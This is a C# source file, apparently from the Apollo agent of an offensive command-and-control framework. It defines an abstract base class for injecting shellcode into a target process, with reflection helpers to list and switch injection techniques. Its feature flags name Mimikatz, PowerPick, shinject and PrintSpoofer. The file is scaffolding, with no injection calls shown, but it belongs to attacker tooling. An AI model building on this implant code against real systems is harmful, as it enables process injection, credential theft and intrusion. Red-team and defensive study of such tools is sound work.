#define COMMAND_NAME_UPPER

#if DEBUG
#undef MIMIKATZ
#undef RUN
#undef SHELL
#undef POWERPICK
#undef PSINJECT
#undef EXECUTE_ASSEMBLY
#undef ASSEMBLY_INJECT
#undef SHINJECT
#undef LIST_INJECTION_TECHNIQUES
#undef GET_INJECTION_TECHNIQUE
#undef SET_INJECTION_TECHNIQUE
#undef PRINTSPOOFER
#undef SPAWN
#define MIMIKATZ
#define RUN
#define SHELL
#define POWERPICK
#define PSINJECT
#define EXECUTE_ASSEMBLY
#define ASSEMBLY_INJECT
#define SHINJECT
#define LIST_INJECTION_TECHNIQUES
#define GET_INJECTION_TECHNIQUE
#define SET_INJECTION_TECHNIQUE
#define PRINTSPOOFER
#define SPAWN
#endif

#define POWERPICK

#if MIMIKATZ || RUN || SHELL || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || SHINJECT || LIST_INJECTION_TECHNIQUES || GET_INJECTION_TECHNIQUE || SET_INJECTION_TECHNIQUE

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using static Utils.ReflectionUtils;
using static Utils.DebugUtils;
using System.Reflection;

namespace Apollo.Injection
{
    public abstract class InjectionTechnique
    {
        internal byte[] positionIndependentCode;
        internal uint processID;
        // probably could do preprocessor stuff for different thread compilation
        private static Type injectionType = typeof(CreateRemoteThreadInjection);

        public InjectionTechnique(byte[] pic, uint pid)
        {
            if (pic.Length == 0)
                throw new Exception("Expected non-zero length for byte array.");
            positionIndependentCode = pic;
            processID = pid;
        }

#if LIST_INJECTION_TECHNIQUES
        public static string[] GetLoadedInjectionTechniques()
        {
            Type[] injectionTypes = GetTypesInNamespace(Assembly.GetExecutingAssembly(), "Apollo.Injection");
            List<string> results = new List<string>();
            foreach (Type t in injectionTypes)
            {
                if (t.Name != typeof(InjectionTechnique).Name)
                results.Add(t.Name);
            }
            return results.ToArray();
        }
#endif

#if SET_INJECTION_TECHNIQUE

        public static bool SetInjectionTechnique(string technique)
        {
            bool bRet = false;
            if (!IsValidInjectionTechnique(technique))
                return bRet;
            try
            {
                var classType = Type.GetType(String.Format("Apollo.Injection.{0}", technique));
                injectionType = classType;
                bRet = true;
            }
            catch (Exception ex)
            {
                DebugWriteLine($"ERROR! Could not set injection technique to {technique}. Reason: {ex.Message}\n\tStackTrace: {ex.StackTrace}");
                bRet = false;
            }
            return bRet;
        }
#endif
        public static Type GetInjectionTechnique()
        {
            return injectionType;
        }

#if SET_INJECTION_TECHNIQUE
        private static bool IsValidInjectionTechnique(string tInjection)
        {
            bool bRet = false;
            tInjection = tInjection.ToLower();
            if (tInjection == typeof(InjectionTechnique).Name.ToLower())
                return bRet;
            Type[] injectionTypes = GetTypesInNamespace(Assembly.GetExecutingAssembly(), "Apollo.Injection");
            foreach (Type t in injectionTypes)
            {
                if (tInjection == t.Name.ToLower())
                {
                    bRet = true;
                    break;
                }
            }
            return bRet;
        }
#endif

        public abstract bool Inject(string arguments = "");
    }
}
#endif